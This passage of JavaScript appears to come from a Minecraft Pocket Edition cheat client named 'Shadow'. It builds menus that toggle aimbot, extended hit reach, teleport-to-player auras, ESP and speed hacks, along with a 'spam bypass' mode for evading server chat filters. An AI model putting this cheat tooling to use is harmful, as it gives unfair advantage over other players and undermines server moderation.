s1.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
checkslapper ? checkslapper = false : checkslapper = true;
if(checkslapper) {
s1.setTextColor(android.graphics.Color.GREEN);
checkslapper = true;
} else {
s1.setTextColor(android.graphics.Color.RED);
checkslapper = false;
}
}
}));
settingLayout.addView(s1);

var s2 = new styleButton("Aim range", "Set aimbot range.");
s2.setTextColor(btnText);
s2.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
settings.dismiss();
setRange("Default is 7", "Set range");
}
}));
settingLayout.addView(s2);

var s3 = new styleButton("Hitbox shadow", "Set hitbox range.");
s3.setTextColor(btnText);
s3.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
settings.dismiss();
setShadow("Default range is 30", "Default height is 2", "Set range");
}
}));
settingLayout.addView(s3);

var s4 = new styleButton("Command prefix", "Set Shadow's command prefix.");
s4.setTextColor(btnText);
s4.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
settings.dismiss();
setPrefix("Default is !", "Set prefix");
}
}));
settingLayout.addView(s4);

var s5 = new styleButton("Heart trigger", "Set how many hearts till autofood etc activates.");
s5.setText("Heart trigger");
s5.setTextColor(btnText);
s5.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
settings.dismiss();
setHeart("Default is 5", "Set trigger");
}
}));
settingLayout.addView(s5);

var s6 = new styleButton("Legal enchants", "Prevent you from setting bad enchant levels.");
if(legalenchant)s6.setTextColor(android.graphics.Color.GREEN);
if(!legalenchant)s6.setTextColor(btnText);
s6.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
legalenchant ? legalenchant = false : legalenchant = true;
if(legalenchant) {
s6.setTextColor(android.graphics.Color.GREEN);
legalenchant = true;
} else {
s6.setTextColor(android.graphics.Color.RED);
legalenchant = false;
}
}
}));
settingLayout.addView(s6);

var s7 = new styleButton("Rainbow HUD", "Make the HUD display rainbow colors.");
if(rainbow)s7.setTextColor(android.graphics.Color.GREEN);
if(!rainbow)s7.setTextColor(btnText);
s7.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
rainbow ? rainbow = false : rainbow = true;
if(rainbow) {
s7.setTextColor(android.graphics.Color.GREEN);
rainbow = true;
} else {
s7.setTextColor(android.graphics.Color.RED);
rainbow = false;
}
}
}));
settingLayout.addView(s7);

var s8 = new styleButton("Ghost button", "Make the Shadow button disappear.");
if(ghost)s8.setTextColor(android.graphics.Color.GREEN);
if(!ghost)s8.setTextColor(btnText);
s8.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
ghost ? ghost = false : ghost = true;
if(ghost) {
s8.setTextColor(android.graphics.Color.GREEN);
btnColor = android.graphics.Color.TRANSPARENT;
stroke = android.graphics.Color.TRANSPARENT;
settings.dismiss();
showMenuBtn();
ghost = true;
} else {
s8.setTextColor(android.graphics.Color.RED);
Shadow.setColor(1, btnColor1);
Shadow.setColor(2, stroke1);
settings.dismiss();
showMenuBtn();
ghost = false;
}
}
}));
settingLayout.addView(s8);

var s10 = new styleButton("Movable menus", "Make all menus movable.");
if(movable)s10.setTextColor(android.graphics.Color.GREEN);
if(!movable)s10.setTextColor(btnText);
s10.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
movable ? movable = false : movable = true;
if(movable) {
s10.setTextColor(android.graphics.Color.GREEN);
movable = true;
} else {
s10.setTextColor(android.graphics.Color.RED);
movable = false;
}
}
}));
settingLayout.addView(s10);

var s11 = new styleButton("Lockon display", "Display the player name you locked onto.");
if(lockon)s11.setTextColor(android.graphics.Color.GREEN);
if(!lockon)s11.setTextColor(btnText);
s11.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
lockon ? lockon = false : lockon = true;
if(lockon) {
s11.setTextColor(android.graphics.Color.GREEN);
lockon = true;
} else {
s11.setTextColor(android.graphics.Color.RED);
lockon = false;
}
}
}));
settingLayout.addView(s11);

var s12 = new styleButton("Side HUD", "Display HUD on side of screen.");
if(side)s12.setTextColor(android.graphics.Color.GREEN);
if(!side)s12.setTextColor(btnText);
s12.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
side ? side = false : side = true;
if(side) {
s12.setTextColor(android.graphics.Color.GREEN);
side = true;
} else {
s12.setTextColor(android.graphics.Color.RED);
side = false;
}
}
}));
settingLayout.addView(s12);

var s13 = new styleButton("Old max enchants", "Max enchant level changes from 32767 to 29000.");
if(newmax)s13.setTextColor(android.graphics.Color.GREEN);
if(!newmax)s13.setTextColor(btnText);
s13.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
newmax ? newmax = false : newmax = true;
if(newmax) {
s13.setTextColor(android.graphics.Color.GREEN);
newmax = true;
} else {
s13.setTextColor(android.graphics.Color.RED);
newmax = false;
}
}
}));
settingLayout.addView(s13);

var s14 = new styleButton("Elevator range", "Set elevator search/tp range.");
s14.setTextColor(btnText);
s14.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
settings.dismiss();
setElevator("Default is 10", "Set range");
}
}));
settingLayout.addView(s14);

var s15 = new styleButton("Highjump height", "Set jump height.");
s15.setTextColor(btnText);
s15.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
settings.dismiss();
setHeight("Default is 5", "Set height");
}
}));
settingLayout.addView(s15);

var s16 = new styleButton("CustomESP block", "Set CustomESP's block to trace.");
s16.setTextColor(btnText);
s16.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
settings.dismiss();
setBlock("Default is 54", "Set block");
}
}));
settingLayout.addView(s16);

var by_ = [];
var bya = {
select: [0, -1],
list: [["Normal"],["Number"],["Character"],["All"]]
}
bya.list.forEach(function (entry, index) {
by_.push(bya.list[index][0]);
});

var adapterb = new android.widget.ArrayAdapter(MainActivity, android.R.layout.simple_list_item_1, by_);

var sb0 = new styleButton("Spam bypass", "Spam bypass messages.");
sb0.setOnClickListener(new android.view.View.OnClickListener() ,{
onClick: function (v) {
var alertb = new android.app.AlertDialog.Builder(MainActivity);
alertb.setTitle("Select bypass");
alertb.setAdapter(adapterb, new android.content.DialogInterface.OnClickListener({
onClick: function (v, pos) {

if(pos == 0){
sp0 = true; //normal spam
sp1 = false; //number bypass
sp2 = false; //character bypass
sp3 = false; //all bypass
}
if(pos == 1){
sp0 = false; //normal spam
sp1 = true; //number bypass
sp2 = false; //character bypass
sp3 = false; //all bypass
}
if(pos == 2){
sp0 = false; //normal spam
sp1 = false; //number bypass
sp2 = true; //character bypass
sp3 = false; //all bypass
}
if(pos == 3){
sp0 = false; //normal spam
sp1 = false; //number bypass
sp2 = false; //character bypass
sp3 = true; //all bypass
}

}
}));
var dialog = alertb.create();
dialog.show();
}
});
settingLayout.addView(sb0);

/*background*/

var colors_0 = [];
var colors0 = {
select: [0, -1],
list: [["Transparent"],["Magenta"],["Blue"],["Black"],["White"],["Red"],["Gray"],["Light gray"],["Yellow"],["Cyan"],["Dark gray"],["Green"]]
}
colors0.list.forEach(function (entry, index) {
colors_0.push(colors0.list[index][0]);
});

var adapter0 = new android.widget.ArrayAdapter(MainActivity, android.R.layout.select_dialog_multichoice, colors_0);

var sc1 = new styleButton("Menu color", "Set background color of Shadow.");
sc1.setOnClickListener(new android.view.View.OnClickListener() ,{
onClick: function (v) {
var alert0 = new android.app.AlertDialog.Builder(MainActivity);
alert0.setTitle("Select menu color");
alert0.setAdapter(adapter0, new android.content.DialogInterface.OnClickListener({
onClick: function (v, pos) {

settings.dismiss();
Shadow.setColor(0, colors0.list[pos]+"");
for(var t = 0; t < 5; t++){
if(t == 1){
settings_menu();
Shadow.save();
}}

}
}));
var dialog = alert0.create();
dialog.show();
}
});
settingLayout.addView(sc1);

/*button*/

var colors_1 = [];
var colors1 = {
select: [0, -1],
list: [["Transparent"],["Magenta"],["Blue"],["Black"],["White"],["Red"],["Gray"],["Light gray"],["Yellow"],["Cyan"],["Dark gray"],["Green"]]
}
colors1.list.forEach(function (entry, index) {
colors_1.push(colors1.list[index][0]);
});

var adapter1 = new android.widget.ArrayAdapter(MainActivity, android.R.layout.simple_list_item_1, colors_1);

var sc2 = new styleButton("Button color", "Set button color of Shadow.");
sc2.setOnClickListener(new android.view.View.OnClickListener() ,{
onClick: function (v) {
var alert1 = new android.app.AlertDialog.Builder(MainActivity);
alert1.setTitle("Select button color");
alert1.setAdapter(adapter1, new android.content.DialogInterface.OnClickListener({
onClick: function (v, pos) {

settings.dismiss();
Shadow.setColor(1, colors1.list[pos]+"");
for(var t = 0; t < 5; t++){
if(t == 1){
settings_menu();
Shadow.save();
}}

}
}));
var dialog = alert1.create();
dialog.show();
}
});
settingLayout.addView(sc2);

/*stroke*/

var colors_2 = [];
var colors2 = {
select: [0, -1],
list: [["Transparent"],["Magenta"],["Blue"],["Black"],["White"],["Red"],["Gray"],["Light gray"],["Yellow"],["Cyan"],["Dark gray"],["Green"]]
}
colors2.list.forEach(function (entry, index) {
colors_2.push(colors2.list[index][0]);
});

var adapter2 = new android.widget.ArrayAdapter(MainActivity, android.R.layout.simple_list_item_1, colors_2);

var sc3 = new styleButton("Stroke color", "Set stroke color of Shadow.");
sc3.setOnClickListener(new android.view.View.OnClickListener() ,{
onClick: function (v) {
var alert2 = new android.app.AlertDialog.Builder(MainActivity);
alert2.setTitle("Select stroke color");
alert2.setAdapter(adapter2, new android.content.DialogInterface.OnClickListener({
onClick: function (v, pos) {

settings.dismiss();
Shadow.setColor(2, colors2.list[pos]+"");
for(var t = 0; t < 5; t++){
if(t == 1){
settings_menu();
Shadow.save();
}}

}
}));
var dialog = alert2.create();
dialog.show();
}
});
settingLayout.addView(sc3);

/*orientation*/

var oris_ = [];
var oris = {
select: [0, -1],
list: [["Horizontal"],["Vertical"]]
}
oris.list.forEach(function (entry, index) {
oris_.push(oris.list[index][0]);
});

var adapter3 = new android.widget.ArrayAdapter(MainActivity, android.R.layout.simple_list_item_1, oris_);

var sc4 = new styleButton("Menu orientation", "Set Shadow menu orientation.");
sc4.setOnClickListener(new android.view.View.OnClickListener() ,{
onClick: function (v) {
var alert3 = new android.app.AlertDialog.Builder(MainActivity);
alert3.setTitle("Select orientation");
alert3.setAdapter(adapter3, new android.content.DialogInterface.OnClickListener({
onClick: function (v, pos) {

settings.dismiss();
mnuOri = pos;
mnuOri1 = pos;
showMenuBtn();
Shadow.save();

}
}));
var dialog = alert3.create();
dialog.show();
}
});
settingLayout.addView(sc4);

/*tracer color

//red 180, 255, 0, 0
//green 180, 0, 255, 0
//blue 180, 0, 0, 255
//yellow 180, 255, 255, 0
//cyan 180, 0, 255, 255
//black 180, 0, 0, 0
//pink 180, 255, 0, 255
*/

var tc_ = [];
var tco = {
select: [0, -1],
list: [["Red"],["Green"],["Blue"],["Yellow"],["Cyan"],["Black"],["Pink"]]
}
tco.list.forEach(function (entry, index) {
tc_.push(tco.list[index][0]);
});

var adapter4 = new android.widget.ArrayAdapter(MainActivity, android.R.layout.simple_list_item_1, tc_);

var sc5 = new styleButton("ESP Color", "Set ESP/Tracer color.");
sc5.setOnClickListener(new android.view.View.OnClickListener() ,{
onClick: function (v) {
var alert4 = new android.app.AlertDialog.Builder(MainActivity);
alert4.setTitle("Select color (restart required)");
alert4.setAdapter(adapter4, new android.content.DialogInterface.OnClickListener({
onClick: function (v, pos) {

Shadow.setEspColor(tco.list[pos]+"");
Shadow.save();

}
}));
var dialog = alert4.create();
dialog.show();
}
});
settingLayout.addView(sc5);

var mc_ = [];
var mco = {
select: [0, -1],
list: [["§1"], ["§2"], ["§3"], ["§4"], ["§5"], ["§6"], ["§7"], ["§8"], ["§9"], ["§0"], ["§a"], ["§b"], ["§c"], ["§d"], ["§e"], ["§f"]]
}
mco.list.forEach(function (entry, index) {
mc_.push(mco.list[index][0]);
});

var adapter5 = new android.widget.ArrayAdapter(MainActivity, android.R.layout.simple_list_item_1, mc_);

var sc6 = new styleButton("MCPE Color", "Set MCPE text color.");
sc6.setOnClickListener(new android.view.View.OnClickListener() ,{
onClick: function (v) {
var alert5 = new android.app.AlertDialog.Builder(MainActivity);
alert5.setTitle("Select color (restart required)");
alert5.setAdapter(adapter5, new android.content.DialogInterface.OnClickListener({
onClick: function (v, pos) {

mcpe = mco.list[pos]+"";
Shadow.save();

}
}));
var dialog = alert5.create();
dialog.show();
}
});
settingLayout.addView(sc6);

var mb_ = [];
var mbo = {
select: [0, -1],
list: [["Button right"],["Button left"]]
}
mbo.list.forEach(function (entry, index) {
mb_.push(mbo.list[index][0]);
});

var adapter6 = new android.widget.ArrayAdapter(MainActivity, android.R.layout.simple_list_item_1, mb_);

var sc7 = new styleButton("Button gravity", "Set where to display the Shadow button.");
sc7.setOnClickListener(new android.view.View.OnClickListener() ,{
onClick: function (v) {
var alert6 = new android.app.AlertDialog.Builder(MainActivity);
alert6.setTitle("Select gravity");
alert6.setAdapter(adapter6, new android.content.DialogInterface.OnClickListener({
onClick: function (v, pos) {

if(pos == 0){
legrav = "RIGHT";
Shadow.save();
bgravity = android.view.Gravity.RIGHT;
}
if(pos == 1){
legrav = "LEFT";
Shadow.save();
bgravity = android.view.Gravity.LEFT;
}

}
}));
var dialog = alert6.create();
dialog.show();
}
});
settingLayout.addView(sc7);

if(mnuOri == 0)settings = new android.widget.PopupWindow(settingLayout1, android.widget.LinearLayout.LayoutParams.FILL_PARENT, android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
if(mnuOri == 1)settings = new android.widget.PopupWindow(settingLayout1, MainActivity.getWindowManager().getDefaultDisplay().getWidth() / 2,MainActivity.getWindowManager().getDefaultDisplay().getHeight());

settings.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.TRANSPARENT));

var bg = new android.graphics.drawable.GradientDrawable();	bg.setColor(background);
settingLayout1.setBackgroundDrawable(bg);
settingLayout1.setPadding(20, 0, 20, 0);

settings.showAtLocation(MainActivity.getWindow()
.getDecorView(), android.view.Gravity.TOP, 0, 0);
} catch (error) {
android.widget.Toast.makeText(MainActivity, error, 1)
.show();
}

}
}));
}

function combat_menu() {
MainActivity.runOnUiThread(new java.lang.Runnable({
run: function () {

try {
var cLayout = new android.widget.LinearLayout(MainActivity);
if(mnuOri == 0)var cScroll = new android.widget.HorizontalScrollView(MainActivity);
if(mnuOri == 1)var cScroll = new android.widget.ScrollView(MainActivity);
var cLayout1 = new android.widget.LinearLayout(MainActivity);
if(mnuOri == 0){
cLayout.setOrientation(android.widget.LinearLayout.HORIZONTAL);
cLayout1.setOrientation(android.widget.LinearLayout.HORIZONTAL);
}
if(mnuOri == 1){
cLayout.setOrientation(android.widget.LinearLayout.VERTICAL);
cLayout1.setOrientation(android.widget.LinearLayout.VERTICAL);
}
cScroll.addView(cLayout);
cLayout1.addView(cScroll);

var mx = 0;
var my = 0;
var nx = 0;
var ny = 0;
var isMoving = false;

cScroll.setOnTouchListener(new android.view.View.OnTouchListener({
onTouch: function (v, e) {
if(e.getAction() == android.view.MotionEvent.ACTION_DOWN){
my = e.getY();
mx = e.getX();
}
if(e.getAction() == android.view.MotionEvent.ACTION_MOVE){
isMoving = true;
ny = e.getRawY();
if(movable)mods.update(-1, parseInt(ny)-parseInt(my), -1, -1);
}
if(e.getAction() == android.view.MotionEvent.ACTION_UP){
isMoving = false;
}
return false;
}
}));

var exit = new styleButton();
exit.setText("Back");
exit.setTextColor(android.graphics.Color.RED);
exit.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
mods.dismiss();
mainMenu();
}
}));
cLayout.addView(exit);

var c1 = new styleButton("Aimbot", "Lock onto nearby players.");
if(aimbot)c1.setTextColor(android.graphics.Color.GREEN);
if(!aimbot)c1.setTextColor(btnText);
c1.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
aimbot ? aimbot = false : aimbot = true;
if(aimbot) {
c1.setTextColor(android.graphics.Color.GREEN);
aimbot = true;
refreshToggle();
} else {
c1.setTextColor(android.graphics.Color.RED);
aimbot = false;
refreshToggle();
}
}
}));
cLayout.addView(c1);

var c2 = new styleButton("Autofood", "Select best food in hotbar when low health.");
if(autofood)c2.setTextColor(android.graphics.Color.GREEN);
if(!autofood)c2.setTextColor(btnText);
c2.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
autofood ? autofood = false : autofood = true;
if(autofood) {
c2.setTextColor(android.graphics.Color.GREEN);
autofood = true;
} else {
c2.setTextColor(android.graphics.Color.RED);
autofood = false;
}
}
}));
cLayout.addView(c2);

var c3 = new styleButton("Auto logoff", "Logoff when near players.");
if(autolog)c3.setTextColor(android.graphics.Color.GREEN);
if(!autolog)c3.setTextColor(btnText);
c3.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
autolog ? autolog = false : autolog = true;
if(autolog) {
c3.setTextColor(android.graphics.Color.GREEN);
autolog = true;
} else {
c3.setTextColor(android.graphics.Color.RED);
autolog = false;
}
}
}));
cLayout.addView(c3);

var c4 = new styleButton("Autopot", "Select best pot in hotbar when low health.");
if(autopot)c4.setTextColor(android.graphics.Color.GREEN);
if(!autopot)c4.setTextColor(btnText);
c4.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
autopot ? autopot = false : autopot = true;
if(autopot) {
c4.setTextColor(android.graphics.Color.GREEN);
autopot = true;
} else {
c4.setTextColor(android.graphics.Color.RED);
autopot = false;
}
}
}));
cLayout.addView(c4);

var c5 = new styleButton("Autosword", "Select best sword in hotbar when near players.");
if(autosword)c5.setTextColor(android.graphics.Color.GREEN);
if(!autosword)c5.setTextColor(btnText);
c5.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
autosword ? autosword = false : autosword = true;
if(autosword) {
c5.setTextColor(android.graphics.Color.GREEN);
autosword = true;
} else {
c5.setTextColor(android.graphics.Color.RED);
autosword = false;
}
}
}));
cLayout.addView(c5);

var c6 = new styleButton("Hit behind", "Teleport behind the player when you hit them.");
if(behind)c6.setTextColor(android.graphics.Color.GREEN);
if(!behind)c6.setTextColor(btnText);
c6.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
behind ? behind = false : behind = true;
if(behind) {
c6.setTextColor(android.graphics.Color.GREEN);
behind = true;
} else {
c6.setTextColor(android.graphics.Color.RED);
behind = false;
}
}
}));
cLayout.addView(c6);

var c7 = new styleButton("Hitbox", "Increase your hit range / reach.");
if(hitbox)c7.setTextColor(android.graphics.Color.GREEN);
if(!hitbox)c7.setTextColor(btnText);
c7.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
hitbox ? hitbox = false : hitbox = true;
if(hitbox) {
c7.setTextColor(android.graphics.Color.GREEN);
hitbox = true;
refreshToggle();
} else {
c7.setTextColor(android.graphics.Color.RED);
hitbox = false;
refreshToggle();
}
}
}));
cLayout.addView(c7);

var c8 = new styleButton("Hit & jump", "Jump when you hit a player.");
if(hitjump)c8.setTextColor(android.graphics.Color.GREEN);
if(!hitjump)c8.setTextColor(btnText);
c8.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
hitjump ? hitjump = false : hitjump = true;
if(hitjump) {
c8.setTextColor(android.graphics.Color.GREEN);
hitjump = true;
} else {
c8.setTextColor(android.graphics.Color.RED);
hitjump = false;
}
}
}));
cLayout.addView(c8);

var c9 = new styleButton("TPaura", "Teleport to nearby players.");
if(tpaura)c9.setTextColor(android.graphics.Color.GREEN);
if(!tpaura)c9.setTextColor(btnText);
c9.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
tpaura ? tpaura = false : tpaura = true;
if(tpaura) {
c9.setTextColor(android.graphics.Color.GREEN);
tpaura = true;
} else {
c9.setTextColor(android.graphics.Color.RED);
tpaura = false;
}
}
}));
cLayout.addView(c9);

var c10 = new styleButton("Grapple", "Teleport to a player when you hit them.");
if(grapple)c10.setTextColor(android.graphics.Color.GREEN);
if(!grapple)c10.setTextColor(btnText);
c10.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
grapple ? grapple = false : grapple = true;
if(grapple) {
c10.setTextColor(android.graphics.Color.GREEN);
grapple = true;
} else {
c10.setTextColor(android.graphics.Color.RED);
grapple = false;
}
}
}));
cLayout.addView(c10);

var c11 = new styleButton("FastEat", "Change food duration/eating speed to zero.");
if(fasteat)c11.setTextColor(android.graphics.Color.GREEN);
if(!fasteat)c11.setTextColor(btnText);
c11.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
fasteat ? fasteat = false : fasteat = true;
if(fasteat) {
c11.setTextColor(android.graphics.Color.GREEN);
fastEat(true);
fasteat = true;
} else {
c11.setTextColor(android.graphics.Color.RED);
fastEat(false);
fasteat = false;
}
}
}));
cLayout.addView(c11);

var c12 = new styleButton("MultiAim", "Lock onto random nearby players.");
if(multiaim)c12.setTextColor(android.graphics.Color.GREEN);
if(!multiaim)c12.setTextColor(btnText);
c12.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
multiaim ? multiaim = false : multiaim = true;
if(multiaim) {
c12.setTextColor(android.graphics.Color.GREEN);
multiaim = true;
} else {
c12.setTextColor(android.graphics.Color.RED);
multiaim = false;
}
}
}));
cLayout.addView(c12);

var c13 = new styleButton("ArmorESP", "Display your & facing player armor damage.");
if(armoresp)c13.setTextColor(android.graphics.Color.GREEN);
if(!armoresp)c13.setTextColor(btnText);
c13.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
armoresp ? armoresp = false : armoresp = true;
if(armoresp) {
c13.setTextColor(android.graphics.Color.GREEN);
armoresp = true;
} else {
c13.setTextColor(android.graphics.Color.RED);
armoresp = false;
}
}
}));
cLayout.addView(c13);

var c14 = new styleButton("Autoclick (root)", "Auto tap center of screen once per second.");
if(autoclick)c14.setTextColor(android.graphics.Color.GREEN);
if(!autoclick)c14.setTextColor(btnText);
c14.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
autoclick ? autoclick = false : autoclick = true;
if(autoclick) {
c14.setTextColor(android.graphics.Color.GREEN);
sec = 1;
autoclick = true;
} else {
c14.setTextColor(android.graphics.Color.RED);
autoclick = false;
}
}
}));
cLayout.addView(c14);

var c15 = new styleButton("Blockhunt aim", "Lock onto nearby blockhunt players.");
if(blockhunt)c15.setTextColor(android.graphics.Color.GREEN);
if(!blockhunt)c15.setTextColor(btnText);
c15.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
blockhunt ? blockhunt = false : blockhunt = true;
if(blockhunt) {
c15.setTextColor(android.graphics.Color.GREEN);
blockhunt = true;
} else {
c15.setTextColor(android.graphics.Color.RED);
blockhunt = false;
}
}
}));
cLayout.addView(c15);

var c16 = new styleButton("Mob aimbot", "Lock onto nearby mobs/entities.");
if(mobaim)c16.setTextColor(android.graphics.Color.GREEN);
if(!mobaim)c16.setTextColor(btnText);
c16.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
mobaim ? mobaim = false : mobaim = true;
if(mobaim) {
c16.setTextColor(android.graphics.Color.GREEN);
mobaim = true;
} else {
c16.setTextColor(android.graphics.Color.RED);
mobaim = false;
}
}
}));
cLayout.addView(c16);

var c19 = new styleButton("HoverAura", "Teleport on top of nearby players.");
if(hover)c19.setTextColor(android.graphics.Color.GREEN);
if(!hover)c19.setTextColor(btnText);
c19.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
hover ? hover = false : hover = true;
if(hover) {
c19.setTextColor(android.graphics.Color.GREEN);
hover = true;
} else {
c19.setTextColor(android.graphics.Color.RED);
hover = false;
}
}
}));
cLayout.addView(c19);

var c20 = new styleButton("SneakAura", "Auto sneak when players are nearby");
if(sneakaura)c20.setTextColor(android.graphics.Color.GREEN);
if(!sneakaura)c20.setTextColor(btnText);
c20.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
sneakaura ? sneakaura = false : sneakaura = true;
if(sneakaura) {
c20.setTextColor(android.graphics.Color.GREEN);
sneakaura = true;
} else {
c20.setTextColor(android.graphics.Color.RED);
sneakaura = false;
}
}
}));
cLayout.addView(c20);

if(mnuOri == 0)mods = new android.widget.PopupWindow(cLayout1, android.widget.LinearLayout.LayoutParams.FILL_PARENT, android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
if(mnuOri == 1)mods = new android.widget.PopupWindow(cLayout1, MainActivity.getWindowManager().getDefaultDisplay().getWidth() / 2,MainActivity.getWindowManager().getDefaultDisplay().getHeight());

mods.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.TRANSPARENT));

var bg = new android.graphics.drawable.GradientDrawable();	bg.setColor(background);
cLayout1.setBackgroundDrawable(bg);
cLayout1.setPadding(20, 0, 20, 0);

mods.showAtLocation(MainActivity.getWindow()
.getDecorView(), android.view.Gravity.TOP, 0, 0);
} catch (error) {
android.widget.Toast.makeText(MainActivity, error, 1)
.show();
}

}
}));
}

function movement_menu() {
MainActivity.runOnUiThread(new java.lang.Runnable({
run: function () {

try {
var mLayout = new android.widget.LinearLayout(MainActivity);
if(mnuOri == 0)var mScroll = new android.widget.HorizontalScrollView(MainActivity);
if(mnuOri == 1)var mScroll = new android.widget.ScrollView(MainActivity);
var mLayout1 = new android.widget.LinearLayout(MainActivity);
if(mnuOri == 0){
mLayout.setOrientation(android.widget.LinearLayout.HORIZONTAL);
mLayout1.setOrientation(android.widget.LinearLayout.HORIZONTAL);
}
if(mnuOri == 1){
mLayout.setOrientation(android.widget.LinearLayout.VERTICAL);
mLayout1.setOrientation(android.widget.LinearLayout.VERTICAL);
}
mScroll.addView(mLayout);
mLayout1.addView(mScroll);

var mx = 0;
var my = 0;
var nx = 0;
var ny = 0;
var isMoving = false;

mScroll.setOnTouchListener(new android.view.View.OnTouchListener({
onTouch: function (v, e) {
if(e.getAction() == android.view.MotionEvent.ACTION_DOWN){
my = e.getY();
mx = e.getX();
}
if(e.getAction() == android.view.MotionEvent.ACTION_MOVE){
isMoving = true;
ny = e.getRawY();
if(movable)movement.update(-1, parseInt(ny)-parseInt(my), -1, -1);
}
if(e.getAction() == android.view.MotionEvent.ACTION_UP){
isMoving = false;
}
return false;
}
}));

var exit = new styleButton();
exit.setText("Back");
exit.setTextColor(android.graphics.Color.RED);
exit.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
movement.dismiss();
mainMenu();
}
}));
mLayout.addView(exit);

var m1 = new styleButton("Autowalk", "Automatically walk.");
if(autowalk)m1.setTextColor(android.graphics.Color.GREEN);
if(!autowalk)m1.setTextColor(btnText);
m1.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
autowalk ? autowalk = false : autowalk = true;
if(autowalk) {
m1.setTextColor(android.graphics.Color.GREEN);
autowalk = true;
} else {
m1.setTextColor(android.graphics.Color.RED);
autowalk = false;
}
}
}));
mLayout.addView(m1);

var m2 = new styleButton("FastBridge", "Teleport to next block when sneaking.");
if(bridge)m2.setTextColor(android.graphics.Color.GREEN);
if(!bridge)m2.setTextColor(btnText);
m2.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
bridge ? bridge = false : bridge = true;
if(bridge) {
m2.setTextColor(android.graphics.Color.GREEN);
bridge = true;
} else {
m2.setTextColor(android.graphics.Color.RED);
bridge = false;
}
}
}));
mLayout.addView(m2);

var m3 = new styleButton("Bunnyhop", "Hop like a bunny when you walk.");
if(bhop)m3.setTextColor(android.graphics.Color.GREEN);
if(!bhop)m3.setTextColor(btnText);
m3.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
bhop ? bhop = false : bhop = true;
if(bhop) {
m3.setTextColor(android.graphics.Color.GREEN);
bhop = true;
} else {
m3.setTextColor(android.graphics.Color.RED);
bhop = false;
}
}
}));
mLayout.addView(m3);

var m4 = new styleButton("Glide", "Glide in the sky when falling.");
if(glide)m4.setTextColor(android.graphics.Color.GREEN);
if(!glide)m4.setTextColor(btnText);
m4.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
glide ? glide = false : glide = true;
if(glide) {
m4.setTextColor(android.graphics.Color.GREEN);
glide = true;
} else {
m4.setTextColor(android.graphics.Color.RED);
glide = false;
}
}
}));
mLayout.addView(m4);

var m5 = new styleButton("Limitless jump", "Enable a special jump button.");
if(jump)m5.setTextColor(android.graphics.Color.GREEN);
if(!jump)m5.setTextColor(btnText);
m5.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
jump ? jump = false : jump = true;
if(jump) {
m5.setTextColor(android.graphics.Color.GREEN);
showJumpButton();
jump = true;
} else {
m5.setTextColor(android.graphics.Color.RED);
jumpGui.dismiss();
jump = false;
}
}
}));
mLayout.addView(m5);

var b16 = new styleButton("Speed", "Set your game speed.");
b16.setTextColor(btnText);
b16.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
movement.dismiss();
editSpeed("Default is 20", "Set speed");
}
}));
mLayout.addView(b16);

var m6 = new styleButton("Spider", "Climb everything like a spider.");
if(spider)m6.setTextColor(android.graphics.Color.GREEN);
if(!spider)m6.setTextColor(btnText);
m6.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
spider ? spider = false : spider = true;
if(spider) {
m6.setTextColor(android.graphics.Color.GREEN);
spider = true;
} else {
m6.setTextColor(android.graphics.Color.RED);
spider = false;
}
}
}));
mLayout.addView(m6);

var m7 = new styleButton("TapTP", "Tap to teleport there.");
if(taptp)m7.setTextColor(android.graphics.Color.GREEN);
if(!taptp)m7.setTextColor(btnText);
m7.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
taptp ? taptp = false : taptp = true;
if(taptp) {
m7.setTextColor(android.graphics.Color.GREEN);
taptp = true;
} else {
m7.setTextColor(android.graphics.Color.RED);
taptp = false;
}
}
}));
mLayout.addView(m7);

var m8 = new styleButton("Tower", "Build a tower when holding a block.");
if(tower)m8.setTextColor(android.graphics.Color.GREEN);
if(!tower)m8.setTextColor(btnText);
